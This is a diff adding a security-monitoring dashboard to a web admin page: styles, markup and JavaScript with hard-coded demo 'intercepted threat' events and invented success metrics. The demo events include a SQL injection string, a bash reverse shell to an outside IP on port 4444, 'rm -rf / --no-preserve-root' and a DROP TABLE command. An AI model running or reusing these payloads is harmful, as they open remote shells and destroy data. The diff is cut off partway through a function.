@@ -397,9 +397,703 @@
       display: none;
       font-size: 13.5px;
     }
+  
+    /* =========================================================================
+       大厂级全域网络安全态势感知与攻防指挥大屏 (Big-Tech Cyber Command Center)
+       ========================================================================= */
+    #cyber-command-center {
+      position: fixed;
+      inset: 0;
+      background: #030712;
+      color: #f1f5f9;
+      z-index: 99999;
+      display: none;
+      flex-direction: column;
+      overflow: hidden;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
+    }
+
+    #cyber-command-center.active {
+      display: flex;
+    }
+
+    /* 科技背景与网格 */
+    .cyber-bg-overlay {
+      position: absolute;
+      inset: 0;
+      pointer-events: none;
+      background: 
+        radial-gradient(circle at 50% 25%, rgba(0, 102, 255, 0.14) 0%, transparent 60%),
+        radial-gradient(circle at 85% 75%, rgba(168, 85, 247, 0.1) 0%, transparent 50%),
+        radial-gradient(circle at 15% 85%, rgba(0, 240, 255, 0.08) 0%, transparent 50%),
+        linear-gradient(rgba(0, 240, 255, 0.025) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0, 240, 255, 0.025) 1px, transparent 1px);
+      background-size: 100% 100%, 100% 100%, 100% 100%, 40px 40px, 40px 40px;
+      z-index: 1;
+    }
+
+    .cyber-scanline {
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(to bottom, transparent 50%, rgba(0, 0, 0, 0.28) 51%);
+      background-size: 100% 4px;
+      pointer-events: none;
+      opacity: 0.7;
+      z-index: 2;
+    }
+
+    /* 顶部科技机翼标题栏 */
+    .cyber-header {
+      position: relative;
+      z-index: 10;
+      height: 72px;
+      background: linear-gradient(180deg, rgba(10, 20, 42, 0.95) 0%, rgba(3, 7, 18, 0.85) 100%);
+      border-bottom: 1px solid rgba(0, 240, 255, 0.35);
+      box-shadow: 0 4px 30px rgba(0, 102, 255, 0.25);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 24px;
+    }
+
+    .cyber-header-left {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      flex: 1;
+    }
+
+    .cyber-clock {
+      font-family: var(--font-mono);
+      font-size: 13.5px;
+      color: #00f0ff;
+      text-shadow: 0 0 10px rgba(0, 240, 255, 0.6);
+      letter-spacing: 1px;
+    }
+
+    .cyber-defcon {
+      display: inline-flex;
+      align-items: center;
+      gap: 7px;
+      padding: 4px 10px;
+      background: rgba(16, 185, 129, 0.15);
+      border: 1px solid rgba(16, 185, 129, 0.45);
+      border-radius: 4px;
+      font-size: 11px;
+      font-weight: 700;
+      color: #10b981;
+      letter-spacing: 0.5px;
+    }
+
+    .cyber-defcon-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: #10b981;
+      box-shadow: 0 0 10px #10b981;
+      animation: cyber-beacon 1.5s infinite;
+    }
+
+    @keyframes cyber-beacon {
+      0% { transform: scale(0.9); opacity: 0.5; }
+      50% { transform: scale(1.4); opacity: 1; box-shadow: 0 0 14px #10b981; }
+      100% { transform: scale(0.9); opacity: 0.5; }
+    }
+
+    /* 顶部中心全景标题 */
+    .cyber-title-center {
+      text-align: center;
+      position: relative;
+    }
+
+    .cyber-main-title {
+      font-size: 23px;
+      font-weight: 900;
+      letter-spacing: 3px;
+      background: linear-gradient(180deg, #ffffff 0%, #00f0ff 65%, #0088ff 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      text-shadow: 0 0 25px rgba(0, 240, 255, 0.6);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+    }
+
+    .cyber-subtitle {
+      font-size: 11px;
+      letter-spacing: 1.5px;
+      color: rgba(148, 163, 184, 0.95);
+      margin-top: 3px;
+      font-weight: 500;
+    }
+
+    .cyber-header-right {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      flex: 1;
+      justify-content: flex-end;
+    }
+
+    .cyber-btn {
+      background: rgba(15, 23, 42, 0.85);
+      border: 1px solid rgba(0, 240, 255, 0.35);
+      color: #e2e8f0;
+      padding: 6px 13px;
+      border-radius: 6px;
+      font-size: 12px;
+      font-weight: 600;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      transition: all 0.2s ease;
+      box-shadow: 0 0 10px rgba(0, 240, 255, 0.1);
+    }
+    .cyber-btn:hover {
+      background: rgba(0, 240, 255, 0.18);
+      border-color: #00f0ff;
+      color: #00f0ff;
+      box-shadow: 0 0 16px rgba(0, 240, 255, 0.4);
+      transform: translateY(-1px);
+    }
+    .cyber-btn-warning {
+      border-color: rgba(245, 158, 11, 0.5);
+      color: #f59e0b;
+      background: rgba(245, 158, 11, 0.12);
+    }
+    .cyber-btn-warning:hover {
+      border-color: #f59e0b;
+      color: #fff;
+      background: rgba(245, 158, 11, 0.28);
+      box-shadow: 0 0 16px rgba(245, 158, 11, 0.45);
+    }
+
+    /* 大屏三栏布局 */
+    .cyber-body {
+      flex: 1;
+      display: grid;
+      grid-template-columns: 370px 1fr 390px;
+      gap: 16px;
+      padding: 14px 18px;
+      position: relative;
+      z-index: 5;
+      overflow: hidden;
+    }
+
+    /* 科技面板容器与发光折角 */
+    .cyber-panel {
+      background: rgba(11, 19, 38, 0.82);
+      backdrop-filter: blur(18px);
+      border: 1px solid rgba(0, 240, 255, 0.24);
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.65), inset 0 0 20px rgba(0, 102, 255, 0.08);
+      border-radius: 8px;
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    .cyber-panel::before {
+      content: "";
+      position: absolute;
+      top: -1px;
+      left: -1px;
+      width: 14px;
+      height: 14px;
+      border-top: 2px solid #00f0ff;
+      border-left: 2px solid #00f0ff;
+      pointer-events: none;
+    }
+    .cyber-panel::after {
+      content: "";
+      position: absolute;
+      bottom: -1px;
+      right: -1px;
+      width: 14px;
+      height: 14px;
+      border-bottom: 2px solid #00f0ff;
+      border-right: 2px solid #00f0ff;
+      pointer-events: none;
+    }
+
+    .cyber-panel-header {
+      padding: 10px 14px;
+      border-bottom: 1px solid rgba(0, 240, 255, 0.16);
+      background: linear-gradient(90deg, rgba(0, 240, 255, 0.1) 0%, transparent 100%);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .cyber-panel-title {
+      font-size: 13px;
+      font-weight: 700;
+      color: #00f0ff;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      letter-spacing: 0.5px;
+      text-shadow: 0 0 8px rgba(0, 240, 255, 0.35);
+    }
+
+    .cyber-panel-badge {
+      font-size: 10px;
+      padding: 2px 7px;
+      border-radius: 4px;
+      font-weight: 600;
+      font-family: var(--font-mono);
+      background: rgba(0, 240, 255, 0.15);
+      color: #00f0ff;
+      border: 1px solid rgba(0, 240, 255, 0.3);
+    }
+
+    .cyber-panel-body {
+      padding: 12px 14px;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      overflow-y: auto;
+      gap: 10px;
+    }
+
+    /* 中间顶部大翻牌器数字栏 */
+    .cyber-counter-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 12px;
+      margin-bottom: 12px;
+    }
+
+    .cyber-counter-card {
+      background: rgba(13, 23, 48, 0.75);
+      border: 1px solid rgba(0, 240, 255, 0.22);
+      border-radius: 6px;
+      padding: 10px 14px;
+      position: relative;
+      overflow: hidden;
+    }
+    .cyber-counter-card::before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 2px;
+      background: linear-gradient(90deg, transparent, #00f0ff, transparent);
+    }
+    .cyber-counter-label {
+      font-size: 11px;
+      color: #94a3b8;
+      margin-bottom: 4px;
+      letter-spacing: 0.5px;
+    }
+    .cyber-counter-num {
+      font-family: var(--font-mono);
+      font-size: 25px;
+      font-weight: 900;
+      letter-spacing: 1px;
+    }
+
+    /* 中间攻防战局画布容器 */
+    .cyber-map-container {
+      flex: 1;
+      background: rgba(5, 12, 28, 0.88);
+      border: 1px solid rgba(0, 240, 255, 0.24);
+      border-radius: 6px;
+      position: relative;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+    }
+
+    #cyberAttackMapCanvas {
+      width: 100%;
+      height: 100%;
+      display: block;
+    }
+
+    /* 探针微网格 3D 卡片 */
+    .cyber-probe-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 8px;
+    }
+
+    .cyber-probe-card {
+      background: rgba(15, 23, 42, 0.7);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 6px;
+      padding: 8px 10px;
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+      transition: all 0.2s;
+    }
+    .cyber-probe-card:hover {
+      border-color: rgba(0, 240, 255, 0.45);
+      background: rgba(0, 240, 255, 0.08);
+    }
+    .cyber-probe-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .cyber-probe-name {
+      font-size: 11px;
+      font-weight: 700;
+      color: #e2e8f0;
+    }
+    .cyber-probe-status {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      font-size: 10px;
+      color: #10b981;
+      font-family: var(--font-mono);
+    }
+    .cyber-probe-wave {
+      height: 22px;
+      width: 100%;
+      display: block;
+    }
+
+    /* 实时攻防威胁瀑布流 */
+    .cyber-threat-stream {
+      display: flex;
+      flex-direction: column;
+      gap: 7px;
+      overflow-y: auto;
+      max-height: 230px;
+    }
+
+    .cyber-threat-item {
+      background: rgba(15, 23, 42, 0.75);
+      border-left: 3px solid #ef4444;
+      border-radius: 4px;
+      padding: 7px 10px;
+      font-size: 11px;
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .cyber-threat-item:hover {
+      background: rgba(239, 68, 68, 0.15);
+      transform: translateX(3px);
+    }
+    .cyber-threat-top {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .cyber-threat-type {
+      font-weight: 700;
+      color: #f87171;
+    }
+    .cyber-threat-time {
+      font-family: var(--font-mono);
+      font-size: 10px;
+      color: #64748b;
+    }
+    .cyber-threat-meta {
+      display: flex;
+      justify-content: space-between;
+      color: #94a3b8;
+      font-size: 10.5px;
+      font-family: var(--font-mono);
+    }
+
+    /* 杀伤链漏斗条 */
+    .cyber-funnel {
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+    .cyber-funnel-step {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      font-size: 11px;
+    }
+    .cyber-funnel-bar-bg {
+      flex: 1;
+      height: 6px;
+      background: rgba(255, 255, 255, 0.08);
+      border-radius: 3px;
+      margin: 0 10px;
+      overflow: hidden;
+    }
+    .cyber-funnel-bar-fill {
+      height: 100%;
+      border-radius: 3px;
+      background: linear-gradient(90deg, #00f0ff, #3b82f6);
+    }
+
+    /* 底部情报滚动跑马灯 */
+    .cyber-marquee-bar {
+      height: 34px;
+      background: rgba(5, 12, 28, 0.95);
+      border-top: 1px solid rgba(0, 240, 255, 0.24);
+      display: flex;
+      align-items: center;
+      padding: 0 20px;
+      position: relative;
+      z-index: 10;
+      overflow: hidden;
+      font-size: 11.5px;
+      color: #94a3b8;
+    }
+    .cyber-marquee-label {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      color: #00f0ff;
+      font-weight: 700;
+      margin-right: 16px;
+      white-space: nowrap;
+    }
+    .cyber-marquee-content {
+      white-space: nowrap;
+      animation: marquee-scroll 30s linear infinite;
+      font-family: var(--font-mono);
+    }
+
   </style>
 </head>
 <body>
+
+  <!-- =========================================================================
+       大厂级全域网络安全态势感知与攻防指挥大屏 (Big-Tech Cyber Command Center)
+       ========================================================================= -->
+  <div id="cyber-command-center">
+    <div class="cyber-bg-overlay"></div>
+    <div class="cyber-scanline"></div>
+
+    <!-- 顶部科技机翼标题栏 -->
+    <header class="cyber-header">
+      <div class="cyber-header-left">
+        <div class="cyber-clock" id="cyberLiveClock">2026-10-24 16:00:00.000</div>
+        <div class="cyber-defcon">
+          <span class="cyber-defcon-dot"></span>
+          <span>DEFCON 3 / 全网坚固主动防御</span>
+        </div>
+      </div>
+
+      <div class="cyber-title-center">
+        <div class="cyber-main-title">
+          <span>ALINKSEC 全域网络安全态势感知与攻防指挥中枢</span>
+        </div>
+        <div class="cyber-subtitle">
+          国家等级保护 2.0 (三级) S3A3G3 / 商用密码 GM/T 0054-2018 密评三级 统一防御矩阵
+        </div>
+      </div>
+
+      <div class="cyber-header-right">
+        <button class="cyber-btn cyber-btn-warning" onclick="triggerScreenDrill()">
+          <span>⚡ 实弹攻防演练</span>
+        </button>
+        <button class="cyber-btn" id="cyberAudioBtn" onclick="toggleAudioAlert()">
+          <span id="cyberAudioIcon">🔇</span>
+          <span id="cyberAudioText">音效已静音</span>
+        </button>
+        <button class="cyber-btn" onclick="toggleFullscreen()">
+          <span>⛶ 全屏显示</span>
+        </button>
+        <button class="cyber-btn" onclick="toggleScreenMode()">
+          <span>🖥️ 返回管理控制台</span>
+        </button>
+      </div>
+    </header>
+
+    <!-- 大屏三栏布局主体 -->
+    <div class="cyber-body">
+      
+      <!-- 左栏: 等保三级合规雷达 / 探针矩阵波形 / 防御指数 -->
+      <div style="display:flex; flex-direction:column; gap:14px;">
+        
+        <!-- 卡片 1: 等保三级能力雷达 -->
+        <div class="cyber-panel" style="flex: 1.1;">
+          <div class="cyber-panel-header">
+            <div class="cyber-panel-title">
+              <span>🎯 等保 2.0 (三级) 综合合规能力雷达</span>
+            </div>
+            <span class="cyber-panel-badge" id="screenRadarBadge">99.6 优</span>
+          </div>
+          <div class="cyber-panel-body" style="align-items:center; justify-content:center; padding:8px;">
+            <canvas id="screenRadarCanvas" width="330" height="230"></canvas>
+          </div>
+        </div>
+
+        <!-- 卡片 2: 8 大微服务探针蜂窝拓扑与实时波形 -->
+        <div class="cyber-panel" style="flex: 1.2;">
+          <div class="cyber-panel-header">
+            <div class="cyber-panel-title">
+              <span>🖥️ 8 大微服务安全探针健康波形</span>
+            </div>
+            <span class="cyber-panel-badge" style="color:#10b981; border-color:#10b981;">8/8 在线</span>
+          </div>
+          <div class="cyber-panel-body" style="padding:10px;">
+            <div class="cyber-probe-grid" id="cyberProbeGrid">
+              <!-- JS 动态渲染 8 大探针微卡片与波形 -->
+            </div>
+          </div>
+        </div>
+
+        <!-- 卡片 3: 计算环境防御指数仪表盘 -->
+        <div class="cyber-panel" style="height: 140px;">
+          <div class="cyber-panel-header">
+            <div class="cyber-panel-title">
+              <span>🛡️ 安全计算环境综合防御指数</span>
+            </div>
+            <span class="cyber-panel-badge" style="color:#a855f7; border-color:#a855f7;">S3 达标</span>
+          </div>
+          <div class="cyber-panel-body" style="align-items:center; justify-content:center; padding:4px;">
+            <canvas id="screenGaugeCanvas" width="300" height="95"></canvas>
+          </div>
+        </div>
+
+      </div>
+
+      <!-- 中栏: 顶部翻牌器 / 核心攻防战局全景画布 / 底部情报 -->
+      <div style="display:flex; flex-direction:column; gap:14px;">
+        
+        <!-- 顶部翻牌器大指标栏 -->
+        <div class="cyber-counter-grid">
+          <div class="cyber-counter-card">
+            <div class="cyber-counter-label">今日全网拦截威胁次数</div>
+            <div class="cyber-counter-num" style="color:#00f0ff;" id="screenCounterTotal">148,296</div>
+          </div>
+          <div class="cyber-counter-card">
+            <div class="cyber-counter-label">核心资产高危阻断</div>
+            <div class="cyber-counter-num" style="color:#ef4444;" id="screenCounterCritical">1,428</div>
+          </div>
+          <div class="cyber-counter-card">
+            <div class="cyber-counter-label">活跃防御微探针节点</div>
+            <div class="cyber-counter-num" style="color:#10b981;" id="screenCounterProbes">8 / 8</div>
+          </div>
+          <div class="cyber-counter-card">
+            <div class="cyber-counter-label">SOAR 自动化响应闭环率</div>
+            <div class="cyber-counter-num" style="color:#f59e0b;" id="screenCounterSoar">100% / <span style="font-size:16px;">12ms</span></div>
+          </div>
+        </div>
+
+        <!-- 全景攻防战局地图画布 -->
+        <div class="cyber-map-container">
+          <div style="position:absolute; top:12px; left:16px; z-index:10; pointer-events:none;">
+            <div style="font-size:12px; font-weight:700; color:#00f0ff; letter-spacing:1px;">🌐 全域攻防拓扑对抗实时推演</div>
+            <div style="font-size:10px; color:#64748b;">实时监测外部 APT、恶意扫描、反弹提权与核心数据保护</div>
+          </div>
+          <canvas id="cyberAttackMapCanvas"></canvas>
+        </div>
+
+      </div>
+
+      <!-- 右栏: 实时威胁瀑布流 / 杀伤链漏斗 / 威胁分布环形图 -->
+      <div style="display:flex; flex-direction:column; gap:14px;">
+        
+        <!-- 卡片 1: 实时威胁拦截瀑布流 -->
+        <div class="cyber-panel" style="flex: 1.2;">
+          <div class="cyber-panel-header">
+            <div class="cyber-panel-title">
+              <span>🚨 实时全网威胁拦截流</span>
+            </div>
+            <span class="cyber-panel-badge" style="color:#ef4444; border-color:#ef4444;">实时阻断</span>
+          </div>
+          <div class="cyber-panel-body" style="padding:10px;">
+            <div class="cyber-threat-stream" id="screenThreatStream">
+              <!-- JS 动态注入威胁流卡片 -->
+            </div>
+          </div>
+        </div>
+
+        <!-- 卡片 2: Cyber Kill Chain 杀伤链防御漏斗 -->
+        <div class="cyber-panel" style="flex: 0.9;">
+          <div class="cyber-panel-header">
+            <div class="cyber-panel-title">
+              <span>⛓️ 杀伤链 5 阶段防御漏斗</span>
+            </div>
+            <span class="cyber-panel-badge">早发现·早隔离</span>
+          </div>
+          <div class="cyber-panel-body" style="padding:12px;">
+            <div class="cyber-funnel">
+              <div class="cyber-funnel-step">
+                <span style="color:#94a3b8; width:75px;">1. 侦察探测</span>
+                <div class="cyber-funnel-bar-bg"><div class="cyber-funnel-bar-fill" style="width:100%;"></div></div>
+                <span style="font-family:var(--font-mono); color:#00f0ff;">100% 捕获</span>
+              </div>
+              <div class="cyber-funnel-step">
+                <span style="color:#94a3b8; width:75px;">2. 漏洞突破</span>
+                <div class="cyber-funnel-bar-bg"><div class="cyber-funnel-bar-fill" style="width:99.8%; background:linear-gradient(90deg,#00f0ff,#10b981);"></div></div>
+                <span style="font-family:var(--font-mono); color:#10b981;">99.8% 拦截</span>
+              </div>
+              <div class="cyber-funnel-step">
+                <span style="color:#94a3b8; width:75px;">3. 提权渗透</span>
+                <div class="cyber-funnel-bar-bg"><div class="cyber-funnel-bar-fill" style="width:100%; background:linear-gradient(90deg,#10b981,#f59e0b);"></div></div>
+                <span style="font-family:var(--font-mono); color:#f59e0b;">100% 阻断</span>
+              </div>
+              <div class="cyber-funnel-step">
+                <span style="color:#94a3b8; width:75px;">4. 横向移动</span>
+                <div class="cyber-funnel-bar-bg"><div class="cyber-funnel-bar-fill" style="width:100%; background:linear-gradient(90deg,#f59e0b,#ef4444);"></div></div>
+                <span style="font-family:var(--font-mono); color:#ef4444;">100% 隔离</span>
+              </div>
+              <div class="cyber-funnel-step">
+                <span style="color:#94a3b8; width:75px;">5. 核心破坏</span>
+                <div class="cyber-funnel-bar-bg"><div class="cyber-funnel-bar-fill" style="width:0%;"></div></div>
+                <span style="font-family:var(--font-mono); color:#38bdf8;">0% 渗透(零事故)</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- 卡片 3: 威胁类型分布环形光晕图 -->
+        <div class="cyber-panel" style="height: 160px;">
+          <div class="cyber-panel-header">
+            <div class="cyber-panel-title">
+              <span>🍩 全网威胁类型分布态势</span>
+            </div>
+            <span class="cyber-panel-badge">动态收敛</span>
+          </div>
+          <div class="cyber-panel-body" style="align-items:center; justify-content:center; padding:6px;">
+            <canvas id="screenThreatDoughnut" width="340" height="110"></canvas>
+          </div>
+        </div>
+
+      </div>
+
+    </div>
+
+    <!-- 底部全域安全态势跑马灯 -->
+    <div class="cyber-marquee-bar">
+      <div class="cyber-marquee-label">
+        <span>⚡ 实时威胁态势快讯</span>
+      </div>
+      <div class="cyber-marquee-content" id="cyberMarqueeContent">
+        [SOAR联动] PB-APT-01 自动封禁高危攻击源 103.21.244.18 | [4A堡垒机] 阻断 rm -rf / 违规删除指令并冻结会话 | [网页防篡改] Web核心目录发生篡改，内核事件捕获并于 12ms 瞬间自愈还原 | [数据库审计] 熔断 DROP TABLE 勒索删表攻击 | [微隔离CFW] 阻断 DMZ 跨域直连 DATA 核心数据库 | [等保合规] 区块链不可篡改审计链与180天日志存留凭据通过数学级验签
+      </div>
+    </div>
+  </div>
+
+  <!-- 大屏威胁取证详情弹窗 -->
+  <div class="modal-backdrop" id="screenForensicModal">
+    <div class="modal" style="max-width: 650px;">
+      <div class="modal-header">
+        <div class="modal-title" style="color:var(--danger); display:flex; align-items:center; gap:8px;">
+          <span>🚨 威胁事件深度取证与数字验签</span>
+        </div>
+        <button class="modal-close" onclick="closeModal('screenForensicModal')">&times;</button>
+      </div>
+      <div class="modal-body" id="screenForensicBody">
+        <!-- 动态注入 -->
+      </div>
+      <div class="modal-footer">
+        <button class="btn btn-primary" onclick="closeModal('screenForensicModal')">关闭取证视图</button>
+      </div>
+    </div>
+  </div>
+
 
   <!-- 顶部导航栏 -->
   <header>
@@ -2018,8 +2712,699 @@
       }
     }
 
-    // 切换大屏/工作台模式
+    
+    // =========================================================================
+    // 大厂级全域网络安全态势感知与攻防指挥大屏 JS 引擎 (Big-Tech Cyber Command Center JS)
+    // =========================================================================
+    
+    // 大屏专属运行状态
+    const screenState = {
+      active: false,
+      audioEnabled: false,
+      animFrameId: null,
+      clockInterval: null,
+      attackRays: [],
+      particles: [],
+      shieldRipples: [],
+      radarAngle: 0,
+      probes: [
+        { id: 'waf', name: '云 WAF 探针', ip: '192.168.10.15', latency: '0.8ms', rules: 24, status: 'PROTECTING', color: '#00f0ff' },
+        { id: 'cfw', name: '云防火墙微隔离', ip: '192.168.10.16', latency: '1.1ms', rules: 18, status: 'ENFORCING', color: '#3b82f6' },
+        { id: 'edr', name: '主机 EDR 探针', ip: '172.16.2.80', latency: '1.4ms', rules: 32, status: 'MONITORING', color: '#10b981' },
+        { id: 'tamper', name: '网页防篡改微探针', ip: '192.168.10.20', latency: '0.5ms', rules: 12, status: 'HEALING', color: '#a855f7' },
+        { id: 'dbaudit', name: '数据库审计探针', ip: '10.0.3.12', latency: '0.9ms', rules: 15, status: 'INTERCEPT', color: '#f59e0b' },
+        { id: 'bastion', name: '4A 特权审计堡垒机', ip: '10.0.1.5', latency: '1.2ms', rules: 10, status: 'RECORDING', color: '#ec4899' },
+        { id: 'logaudit', name: '日志防篡改存留', ip: '10.0.4.8', latency: '1.6ms', rules: 8, status: 'VERIFIED', color: '#06b6d4' },
+        { id: 'backup', name: '国密异地容灾备份', ip: '10.200.0.1', latency: '2.4ms', rules: 6, status: 'SYNCED', color: '#14b8a6' }
+      ],
+      nodes: {},
+      threatEvents: [
+        { time: '16:02:14', probe: 'WAF', type: 'SQL 联合注入探测', ip: '103.21.244.18', geo: '🇺🇸 美国', level: 'CRITICAL', action: '403 BLOCKED', payload: "1' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE '1'='1" },
+        { time: '16:01:52', probe: 'EDR', type: 'Bash 反弹 Shell 提权', ip: '185.220.101.5', geo: '🇷🇺 境外Tor', level: 'CRITICAL', action: 'KILL PROCESS', payload: "bash -i >& /dev/tcp/185.220.101.5/4444 0>&1" },
+        { time: '16:01:28', probe: 'TAMPER', type: 'Web 核心目录篡改', ip: '198.51.100.24', geo: '🇳🇱 荷兰', level: 'HIGH', action: '12ms 自愈还原', payload: "恶意覆写 /var/www/html/index.php (SHA-256指纹不符 -> 毫秒级安全镜象还原)" },
+        { time: '16:00:59', probe: 'DBAUDIT', type: '高危 DROP 勒索删表', ip: '10.0.3.12', geo: '内网横向', level: 'CRITICAL', action: 'SESSION RESET', payload: "DROP TABLE users_credential; -- DBA-101 触发" },
+        { time: '16:00:31', probe: 'BASTION', type: '4A 根目录 rm 擦除', ip: '10.0.1.5', geo: '4A 运维区', level: 'CRITICAL', action: 'CMD-101 阻断', payload: "rm -rf / --no-preserve-root (违规特权指令强拦截)" },
+        { time: '16:00:05', probe: 'CFW', type: 'DMZ 违规跨域直连', ip: '192.168.10.20', geo: 'DMZ 隔离区', level: 'HIGH', action: 'ZONE BLOCKED', payload: "DMZ 节点试图直接握手核心 DATA 数据区 3306 端口 (违规越界隔离)" }
+      ]
+    };
+
+    // 网页音频合成器 (Web Audio API)
+    let audioCtx = null;
+    function playSciFiAlertSound(type = 'intercept') {
+      if (!screenState.audioEnabled) return;
+      try {
+        const AudioContext = window.AudioContext || window.webkitAudioContext;
+        if (!audioCtx) audioCtx = new AudioContext();
+        if (audioCtx.state === 'suspended') audioCtx.resume();
+        
+        const osc = audioCtx.createOscillator();
+        const gain = audioCtx.createGain();
+        osc.connect(gain);
+        gain.connect(audioCtx.destination);
+        
+        const now = audioCtx.currentTime;
+        if (type === 'critical') {
+          osc.type = 'sawtooth';
+          osc.frequency.setValueAtTime(880, now);
+          osc.frequency.exponentialRampToValueAtTime(220, now + 0.22);
+          gain.gain.setValueAtTime(0.12, now);
+          gain.gain.linearRampToValueAtTime(0.01, now + 0.22);
+          osc.start();
+          osc.stop(now + 0.22);
+        } else {
+          osc.type = 'sine';
+          osc.frequency.setValueAtTime(523.25, now);
+          osc.frequency.exponentialRampToValueAtTime(880, now + 0.15);
+          gain.gain.setValueAtTime(0.08, now);
+          gain.gain.linearRampToValueAtTime(0.01, now + 0.15);
+          osc.start();
+          osc.stop(now + 0.15);
+        }
+      } catch (e) {
+        console.warn('Audio play failed:', e);
+      }
+    }
+
+    function toggleAudioAlert() {
+      screenState.audioEnabled = !screenState.audioEnabled;
+      const icon = document.getElementById('cyberAudioIcon');
+      const text = document.getElementById('cyberAudioText');
+      if (screenState.audioEnabled) {
+        icon.innerText = '🔊';
+        text.innerText = '音效已开启';
+        playSciFiAlertSound('info');
+        showToast('🔊 大屏高危攻防音效已开启');
+      } else {
+        icon.innerText = '🔇';
+        text.innerText = '音效已静音';
+        showToast('🔇 大屏音效已关闭');
+      }
+    }
+
+    function toggleFullscreen() {
+      const center = document.getElementById('cyber-command-center');
+      if (!document.fullscreenElement) {
+        if (center.requestFullscreen) center.requestFullscreen();
+        else if (center.webkitRequestFullscreen) center.webkitRequestFullscreen();
+      } else {
+        if (document.exitFullscreen) document.exitFullscreen();
+      }
+    }
+
+    // 切换大屏/控制台模式
     function toggleScreenMode() {
+      state.isScreenMode = !state.isScreenMode;
+      const center = document.getElementById('cyber-command-center');
+      const text = document.getElementById('screenModeText');
+      const icon = document.getElementById('screenModeIcon');
+
+      if (state.isScreenMode) {
+        center.classList.add('active');
+        screenState.active = true;
+        text.innerText = '返回管理控制台';
+        icon.innerText = '🖥️';
+        initCyberScreen();
+      } else {
+        center.classList.remove('active');
+        screenState.active = false;
+        text.innerText = '切换态势大屏';
+        icon.innerText = '🌌';
+        if (screenState.animFrameId) cancelAnimationFrame(screenState.animFrameId);
+        if (screenState.clockInterval) clearInterval(screenState.clockInterval);
+      }
+    }
+
+    // 初始化态势大屏全部画布与动画
+    function initCyberScreen() {
+      startCyberClock();
+      renderCyberProbeGrid();
+      renderCyberThreatStream();
+      initCyberAttackMap();
+      initScreenRadar();
+      initScreenGauge();
+      initScreenThreatDoughnut();
+      startCyberAnimationLoop();
+    }
+
+    // 高精度数字时钟 (精确到毫秒)
+    function startCyberClock() {
+      const clockEl = document.getElementById('cyberLiveClock');
+      if (screenState.clockInterval) clearInterval(screenState.clockInterval);
+      screenState.clockInterval = setInterval(() => {
+        const now = new Date();
+        const y = now.getFullYear();
+        const m = String(now.getMonth() + 1).padStart(2, '0');
+        const d = String(now.getDate()).padStart(2, '0');
+        const hh = String(now.getHours()).padStart(2, '0');
+        const mm = String(now.getMinutes()).padStart(2, '0');
+        const ss = String(now.getSeconds()).padStart(2, '0');
+        const ms = String(now.getMilliseconds()).padStart(3, '0');
+        clockEl.innerText = `${y}-${m}-${d} ${hh}:${mm}:${ss}.${ms}`;
+      }, 50);
+    }
+
+    // 渲染 8 大探针网格与动态波形 Canvas
+    function renderCyberProbeGrid() {
+      const grid = document.getElementById('cyberProbeGrid');
+      grid.innerHTML = screenState.probes.map(p => `
+        <div class="cyber-probe-card">
+          <div class="cyber-probe-header">
+            <span class="cyber-probe-name">${p.name}</span>
+            <span class="cyber-probe-status"><span class="cyber-defcon-dot" style="width:6px;height:6px;background:${p.color};box-shadow:0 0 6px ${p.color};"></span>${p.status}</span>
+          </div>
+          <div style="display:flex; justify-content:space-between; font-size:10px; color:#64748b; font-family:var(--font-mono);">
+            <span>${p.ip}</span>
+            <span>${p.latency}</span>
+          </div>
+          <canvas class="cyber-probe-wave" id="probeWave_${p.id}" width="150" height="22"></canvas>
+        </div>
+      `).join('');
+    }
+
+    // 渲染实时威胁拦截瀑布流
+    function renderCyberThreatStream() {
+      const stream = document.getElementById('screenThreatStream');
+      stream.innerHTML = screenState.threatEvents.map((e, idx) => `
+        <div class="cyber-threat-item" style="border-left-color:${e.level === 'CRITICAL' ? '#ef4444' : '#f59e0b'};" onclick="openScreenForensicModal(${idx})">
+          <div class="cyber-threat-top">
+            <span class="cyber-threat-type" style="color:${e.level === 'CRITICAL' ? '#f87171' : '#fbbf24'};">[${e.probe}] ${e.type}</span>
+            <span class="cyber-threat-time">${e.time}</span>
+          </div>
+          <div class="cyber-threat-meta">
+            <span>${e.geo} ${e.ip}</span>
+            <span style="color:#10b981; font-weight:700;">${e.action}</span>
+          </div>
+        </div>
+      `).join('');
+    }
+
+    // 打开大屏深度取证弹窗
+    function openScreenForensicModal(idx) {
+      const e = screenState.threatEvents[idx];
+      if (!e) return;
+      const body = document.getElementById('screenForensicBody');
+      body.innerHTML = `
+        <div style="background:#0f172a; border:1px solid #1e293b; border-radius:6px; padding:14px; margin-bottom:14px;">
